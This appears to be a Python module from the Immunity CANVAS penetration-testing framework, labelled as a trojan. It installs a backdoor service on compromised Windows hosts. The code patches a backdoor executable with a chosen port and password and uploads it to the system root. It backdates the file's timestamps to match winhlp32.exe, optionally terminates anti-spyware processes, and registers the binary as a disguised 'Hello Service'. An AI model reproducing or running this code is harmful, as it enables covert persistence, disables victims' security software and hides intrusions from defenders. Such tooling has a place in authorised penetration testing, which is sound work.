#! /usr/bin/env python

import sys
if "." not in sys.path: 
    sys.path.append(".")

import os
import getopt
import socket
import sys
import struct
import time

from exploitutils import *
from tcpexploit import *
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import canvasengine
from libs.ctelnetlib import Telnet

from MOSDEF import mosdef as mosdef
from ExploitTypes.localcommand import LocalCommand

# GUI info
NAME                            = "Install MOSDEF Service"
DESCRIPTION                     = "Installs MOSDEF service"
VERSION                         = "0.1"

DOCUMENTATION                   = {}
DOCUMENTATION["Repeatability"]  = "once"
DOCUMENTATION["Notes"]          = "This will change directory to the systemroot on windows. Don't run it at the same time as a module that wants to stay in another directory"
DOCUMENTATION["TUTORIAL"]       = "A free web tutorial on using this module is available at: http://forum.immunityinc.com/index.php?topic=377.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Trojans"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Windows", "i386"] ]
                                                                                
antispywarelist = ["gcasDtServ.exe","gcasServ.exe"]

class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.version                = 0
        self.host                   = "127.0.0.1"
        self.port                   = 5555
        self.name                   = NAME
        self.destdir                = {}
        self.destdir["win32"]       = "%SYSTEMROOT%"
        self.sourceDict             = {}
        self.sourceDict["win32"]    = "backdoors/mosdefservice.exe"
        self.binaryName             = "mosdefservice.exe"
        self.serviceName            = "helloservice"
        self.displayName            = "Hello Service"
        self.killantispyware        = 0
        self.ignoreantispyware      = 0
        self.result                 = 0
    
    def test(self):
        "Not completely sure what I want to do with this yet"
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

        s = self.gettcpsock()
        
        try:
            s.connect((self.host, self.port))
        except Exception:
            return 0
        
        return 1

    def getargs(self):
        self.port               = int(self.argsDict.get("port", self.port))
        self.displayName        = self.argsDict.get("displayName", self.displayName)
        self.serviceName        = self.argsDict.get("serviceName", self.serviceName)
        self.binaryName         = self.argsDict.get("binaryName", self.binaryName)
        self.ignoreantispyware  = self.argsDict.get("ignoreantispyware", self.ignoreantispyware)
        self.killantispyware    = self.argsDict.get("killantispyware", self.killantispyware)
        self.password           = self.argsDict.get("password", self.password)
        self.password           = self.password[:32]
        self.password           = stroverwrite("\x00"*32, self.password, 0)
        self.target             = self.argsDict["passednodes"][0].get_known_host("127.0.0.1")

    def run(self):
        self.getargs()

        if self.serviceName.count(" "):
            self.log("Service Name cannot have spaces or Windows won't start it up!")
            return 0
        
        self.log("Using password: %s"%prettyprint(self.password))
        
        i = -1
        for node in self.argsDict["passednodes"]:
            i += 1
            s = self.gettcpsock(node)
            try:
                ret = s.connect(("127.0.0.1",self.port))
            except:
                #timed out, or socket.error
                ret = -1

            self.log("Socket connect on node %s returned: %s"%(node.getname(),ret))
         
            if ret != -1:
                self.log("Node %s has port %d already in use"%(node.getname(),self.port))
                continue
            if "win32api" in node.capabilities:
                nodeos = "win32"
            else:
                nodeos = "unknown"
                self.log("Node.capabilities: %s"%node.capabilities)
                continue

            # destination directory
            destdir = self.destdir[nodeos]
            if nodeos == "win32":
                # handle environment variables and replace them in our destdir
                systemroot  = node.shell.GetEnvironmentVariable("SYSTEMROOT")
                destdir     = destdir.replace("%SYSTEMROOT%", systemroot)

            # change directory so our upload goes to the right place
            chdir = self.engine.getModuleExploit("chdir")
            chdir.link(self, nodes=[node])
            chdir.argsDict["directory"] = destdir

            # need to make sure all chdir's return the same code on success
            chdir.run()
            self.log("chdir result: %s"%chdir.result)
            #theoretically we're in the systemroot now, or wherever we want to be
            
            if nodeos in ["win32"] or nodeos.count("Windows"):
                self.log("Installing mosdef service on a Windows machine")
                doinstall = 1
                # first we need to check to see if the service already exists
                enum = self.engine.getModuleExploit("enumservices")
                enum.link(self, nodes=[node])
                enum.run()
                allservices = enum.result.get(node.getname(), None)

                # then we need to bail if it does
                if allservices == None:
                    self.log("Couldn't get services list on node %s...something is clearly wrong"%node.getname())
                    continue

                for service in allservices:
                    if service[0] == self.serviceName:
                        self.log("Found service already named %s - skipping node %s"%(self.serviceName,node.getname()))
                        doinstall=0

                # then we need to check to see if MS Anti-Spyware is running
                ps = self.engine.getModuleExploit("ps")
                ps.link(self, nodes=[node])
                ps.run()
                allps = ps.result[0]

                # bail if we find any spyware/malware detection that would hit on us
                for process in allps:
                    if process["exe"] in antispywarelist:
                        self.log("Anti-Malware software found: %s pid %s"%(process["exe"],process["pid"]))
                        if not self.killantispyware:
                            if not self.ignoreantispyware:
                                doinstall = 0
                                break
                            else:
                                self.log("Ignoring anti-spyware processes")
                        else:
                            # kill this process
                            node.shell.TerminateProcess(process["pid"])
                            
                if not doinstall:
                    self.log("Due to complicating factors for installing a service, not installing our service on node %s"%node.getname())
                    continue
                
                # first we need to transform our input file such that it uses the new port
                sourcefile  = self.sourceDict[nodeos]
                data        = file(sourcefile, "rb").read()
                
                # replace push 5555 with push self.port
                self.log("Using port %d for MOSDEFService"%self.port)
                
                data                = data.replace(mosdef.assemble("push $5555", "X86"), mosdef.assemble("push $%d" % self.port, "X86"))
                oldpassword         = "A"*16 + "B"*16
                data                = data.replace(oldpassword, self.password)
                modified_sourcefile = sourcefile+".port_%d" % self.port
                outfd               = file(modified_sourcefile,"wb+")
                outfd.write(data)
                outfd.close()

                # now we've written to modified_sourcefile, so we need to use that as our upload src
                upload = self.engine.getModuleExploit("upload")
                upload.link(self, nodes=[node])
                upload.argsDict["source"]       = modified_sourcefile
                upload.argsDict["destfilename"] = self.binaryName
                upload.run()
                self.log("upload.result: %s" % upload.result)
                
                # now touch file to be the same time as another file commonly found
                tff = self.engine.getModuleExploit("touchfromfile")
                tff.link(self, nodes=[node])
                touchsourcefile = destdir+"\\"+"winhlp32.exe"
                
                self.log("Touching from source file %s" % touchsourcefile)

                tff.argsDict["srcfile"] = touchsourcefile
                tff.argsDict["dstfile"] = self.binaryName
                tff.run()
                
                # create the service and start it to do this we need to know the binary name and its full path
                binname         = destdir+"\\"+self.binaryName
                createservice   = self.engine.getModuleExploit("createservice")
                createservice.link(self)

                createservice.argsDict["passednodes"]   = [node]
                createservice.argsDict["binaryName"]    = binname
                createservice.argsDict["serviceName"]   = self.serviceName
                createservice.argsDict["displayName"]   = self.displayName

                from win32MosdefShellServer import SERVICE_WIN32_SHARE_PROCESS
                from win32MosdefShellServer import SERVICE_WIN32_OWN_PROCESS
                createservice.argsDict["serviceType"] = SERVICE_WIN32_OWN_PROCESS
                createservice.run()
                
                self.log("Createservice result: %s" % createservice.result)

                startservice                = self.engine.getModuleExploit("startservice")
                startservice.serviceName    = self.serviceName
                startservice.link(self)
                startservice.run()
                result = startservice.result

                self.log("Startservice result=%s" % result)
                self.result = 1

        return self.result

if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
        
                
                  


    
        
    
    
